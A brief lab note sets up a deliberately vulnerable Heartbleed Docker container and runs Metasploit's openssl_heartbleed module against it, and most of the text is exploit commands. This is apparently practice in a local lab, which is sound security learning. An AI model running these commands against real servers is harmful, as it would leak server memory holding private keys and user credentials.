docker pull andrewmichaelsmith/docker-heartbleed
docker run -d andrewmichaelsmith/docker-heartbleed

use containerips to get container ip

how to run heartbleed 

then run

 docker run --rm -it metasploitframework/metasploit-framework
to open metasploit (the -it command makes it interactive)


then do

use auxiliary/scanner/ssl/openssl_heartbleed
set VERBOSE true
set RHOSTS <ip>
exploit


(in msf console)
